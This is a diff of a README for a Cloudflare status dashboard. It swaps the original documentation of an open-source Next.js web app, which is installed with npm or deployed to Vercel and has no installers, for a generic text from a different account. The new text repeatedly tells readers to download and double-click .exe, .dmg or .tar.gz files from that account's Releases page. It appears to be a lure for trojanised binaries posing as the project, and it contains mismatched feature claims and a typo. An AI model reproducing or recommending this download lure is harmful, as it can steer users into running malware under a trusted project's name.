@@ -1,235 +1,78 @@
-# Cloudflare Status Dashboard
-
-A real-time*, NOC-style status dashboard for monitoring Cloudflare's global infrastructure. Built with Next.js and designed for network operations centers, IT teams, and anyone who needs to keep an eye on Cloudflare's service health.
-
-> *Real-time updates occur every 30 minutes via auto-refresh.
-
-![Next.js](https://img.shields.io/badge/Next.js-16-black?logo=next.js)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?logo=typescript)
-![License](https://img.shields.io/badge/License-MIT-green)
-[![GitHub Issues](https://img.shields.io/github/issues/wbfoss/cf-status-dashboard)](https://github.com/wbfoss/cf-status-dashboard/issues)
-[![GitHub Stars](https://img.shields.io/github/stars/wbfoss/cf-status-dashboard)](https://github.com/wbfoss/cf-status-dashboard/stargazers)
-
-## Features
-
-### Real-Time* Monitoring
-- **Live Status Updates** - Auto-refreshes every 30 minutes
-- **343+ Data Centers** - Complete coverage of Cloudflare's global network
-- **110+ Core Services** - Monitor all Cloudflare products and services
-
-### Interactive World Map
-- **Global Visualization** - See all data centers on an interactive map
-- **Region Filtering** - Filter by continent (Americas, Europe, Asia, Africa, Oceania)
-- **Status Indicators** - Color-coded markers with glow effects for issues
-- **Zoom & Pan** - Navigate the map with intuitive controls
-
-### Status Overview
-- **Network Health Percentage** - At-a-glance health metric
-- **Active Incidents** - Real-time* incident tracking
-- **Scheduled Maintenance** - Upcoming maintenance windows
-- **Status Breakdown** - Visual progress bar showing operational vs affected
-
-### Detailed Views
-- **Data Centers Page** - Searchable, filterable list of all 343 data centers
-- **Services Page** - Complete list of core services sorted by status priority
-
-### User Experience
-- **Dark Theme** - NOC-optimized dark interface
-- **Local Timezone** - Timestamps displayed in your local timezone
-- **Mobile Responsive** - Works on desktop, tablet, and mobile
-- **Accessibility** - Keyboard navigable with screen reader support
-
-## One-Click Deploy
-
-Deploy your own Cloudflare Status Dashboard in seconds:
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fwbfoss%2Fcf-status-dashboard&project-name=cloudflare-status-dashboard&repository-name=cf-status-dashboard&demo-title=Cloudflare%20Status%20Dashboard&demo-description=Real-time%20NOC-style%20dashboard%20for%20monitoring%20Cloudflare%20infrastructure&demo-url=https%3A%2F%2Fcf-status-dashboard.vercel.app)
-
-**No configuration required!** The dashboard works out of the box - just click deploy and you're done.
-
-## Quick Start
-
-### Prerequisites
-- Node.js 18+
-- npm, yarn, or pnpm
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/wbfoss/cf-status-dashboard.git
-
-# Navigate to the project
-cd cf-status-dashboard
-
-# Install dependencies
-npm install
-
-# Start development server
-npm run dev
-```
-
-Open [http://localhost:3000](http://localhost:3000) in your browser.
-
-### Production Build
-
-```bash
-# Build for production
-npm run build
-
-# Start production server
-npm start
-```
-
-## Deployment
-
-### Vercel (Recommended)
-
-Use the [One-Click Deploy](#one-click-deploy) button above, or deploy manually:
-
-```bash
-npm i -g vercel
-vercel
-```
-
-### Docker
-
-```dockerfile
-FROM node:18-alpine AS builder
-WORKDIR /app
-COPY package*.json ./
-RUN npm ci
-COPY . .
-RUN npm run build
-
-FROM node:18-alpine AS runner
-WORKDIR /app
-COPY --from=builder /app/.next/standalone ./
-COPY --from=builder /app/.next/static ./.next/static
-COPY --from=builder /app/public ./public
-EXPOSE 3000
-CMD ["node", "server.js"]
-```
-
-### Other Platforms
-- **Netlify** - Works out of the box with Next.js adapter
-- **AWS Amplify** - Supports Next.js SSG
-- **Cloudflare Pages** - Ironic but works great!
-
-## Project Structure
-
-```
-cf-status-dashboard/
-├── src/
-│   ├── app/                    # Next.js App Router pages
-│   │   ├── page.tsx           # Main dashboard
-│   │   ├── services/          # Services list page
-│   │   └── datacenters/       # Data centers list page
-│   ├── components/            # React components
-│   │   ├── Header.tsx         # Navigation header
-│   │   ├── StatusSummary.tsx  # Status overview card
-│   │   ├── WorldMap.tsx       # Interactive map
-│   │   ├── IncidentsPanel.tsx # Active incidents
-│   │   └── MaintenancePanel.tsx
-│   └── lib/                   # Utilities and data
-│       ├── api.ts             # Cloudflare API integration
-│       ├── types.ts           # TypeScript definitions
-│       └── datacenters.ts     # DC coordinates mapping
-├── public/                    # Static assets
-└── package.json
-```
-
-## Configuration
-
-### Environment Variables
-
-No environment variables required! The dashboard fetches data directly from Cloudflare's public status API.
-
-### Customization
-
-**Refresh Interval** - Edit `src/lib/api.ts`:
-```typescript
-const REFRESH_INTERVAL = 30 * 60 * 1000; // 30 minutes (in milliseconds)
-```
-
-**Theme Colors** - Edit `src/app/globals.css`:
-```css
-:root {
-  --noc-operational: #3fb950;
-  --noc-degraded: #d29922;
-  --noc-major: #f85149;
-  /* ... */
-}
-```
-
-## API Reference
-
-This dashboard consumes Cloudflare's public Status API:
-
-| Endpoint | Description |
-|----------|-------------|
-| `/api/v2/summary.json` | Overall status, components, incidents |
-| `/api/v2/components.json` | All components and their status |
-| `/api/v2/incidents.json` | Current and past incidents |
-
-Data is fetched client-side using [SWR](https://swr.vercel.app/) for efficient caching and revalidation.
-
-## Contributing
-
-We welcome contributions from the community! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-### Ways to Contribute
-- Report bugs via [GitHub Issues](https://github.com/wbfoss/cf-status-dashboard/issues)
-- Suggest features or improvements
-- Submit pull requests
-- Improve documentation
-- Add missing data center coordinates
-
-### Development
-
-```bash
-# Install dependencies
-npm install
-
-# Run development server with hot reload
-npm run dev
-
-# Run type checking
-npm run lint
-
-# Build for production
-npm run build
-```
-
-## Roadmap
-
-- [ ] Historical uptime charts
-- [ ] Email/Slack notifications
-- [ ] PWA support for mobile
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-This dashboard visualizes data from [cloudflarestatus.com](https://www.cloudflarestatus.com) APIs in a NOC-style interface. As fans of Cloudflare and their incredible global infrastructure, we built this as a simple way to monitor their network status.
-
-Thank you to [Cloudflare](https://cloudflare.com) for providing public status APIs and for building an amazing platform that powers so much of the internet.
-
-### Built With
-
-- [Next.js](https://nextjs.org) - React framework
-- [react-simple-maps](https://www.react-simple-maps.io) - Interactive maps
-- [Heroicons](https://heroicons.com) - Icons
-
-## Support
-
-- **Issues & Bugs**: [GitHub Issues](https://github.com/wbfoss/cf-status-dashboard/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/wbfoss/cf-status-dashboard/discussions)
-
----
-
-An open source project by [wbfoss.org](https://wbfoss.org)
-
-*Not affiliated with Cloudflare, Inc. This is an independent community project.*
+# 🌐 cf-status-dashboard - Monitor Cloudflare's Status Easily
+
+## 📥 Download Now
+[![Download cf-status-dashboard](https://img.shields.io/badge/Download-cf--status--dashboard-blue?style=for-the-badge)](https://github.com/rkzinn10/cf-status-dashboard/releases)
+
+## 🚀 Getting Started
+Welcome to the cf-status-dashboard! This application provides a real-time view of Cloudflare's global infrastructure status. With an interactive 3D globe and a world map, you can easily monitor Cloudflare's performance and availability. 
+
+### 🖥️ System Requirements
+To use cf-status-dashboard, you should have:
+- A computer running Windows, macOS, or Linux.
+- A stable internet connection.
+- Updated web browser (Chrome, Firefox, Safari, or Edge).
+
+## 📦 Download & Install
+To get started, visit the [Releases page](https://github.com/rkzinn10/cf-status-dashboard/releases) to download the latest version of cf-status-dashboard. 
+
+### Steps to Download:
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of cf-status-dashboard.
+3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+4. Download the file to your computer.
+5. Once the download is complete, locate the file and double-click it to start the installation.
+
+## 🔧 Installation Instructions
+### For Windows:
+1. After downloading the .exe file, double-click it.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, launch the application from your Start Menu.
+
+### For macOS:
+1. Download the .dmg file and double-click it.
+2. Drag the cf-status-dashboard icon into your Applications folder.
+3. Open your Applications folder and double-click the cf-status-dashboard to start the application.
+
+### For Linux:
+1. Download the .tar.gz file.
+2. Extract the files using a terminal or file manager.
+3. Open the terminal and navigate to the extracted folder.
+4. Run the application using the command provided in the extracted package.
+
+## 🎨 Features
+- **Real-Time Monitoring:** Get instant updates on Cloudflare's status with a visual dashboard.
+- **Interactive Glove and Map:** Explore Cloudflare’s global infrastructure on a 3D globe and 2D world map.
+- **User-Friendly Interface:** Designed for ease of use for all skill levels.
+- **Open Source:** Contribute to the project and improve its features.
+
+## 🔄 Updating the Application
+Keep your application up-to-date for the best performance. To update:
+1. Navigate to the [Releases page](https://github.com/rkzinn10/cf-status-dashboard/releases).
+2. Download the latest version following the same steps as before.
+3. Install the update by following the installation instructions based on your operating system.
+
+## 🐞 Troubleshooting
+If you encounter issues using cf-status-dashboard:
+- Ensure your internet connection is stable.
+- Restart your computer and try launching the application again.
+- Check for any available updates and install them.
+- Visit the project's GitHub page for more resources and community support.
+
+## 📞 Support
+If you need further assistance, feel free to raise issues on the project's GitHub Issues page. Our community and maintainers are here to help you.
+
+## 📝 Contributing
+We welcome contributions to improve the cf-status-dashboard. If you'd like to help, check our guidelines on the GitHub repository. You can report bugs, suggest features, or even submit your code.
+
+## 🏷️ Topics
+This project covers various topics such as:
+- Cloudflare
+- Cloudflare Status
+- Dashboard  
+- Monitoring  
+- Visualization
+
+We hope you enjoy tracking Cloudflare's status with cf-status-dashboard. Make sure to download and start monitoring today!
+
+## 📥 Download Again
+For your convenience, here is the link to [download cf-status-dashboard](https://github.com/rkzinn10/cf-status-dashboard/releases) again.
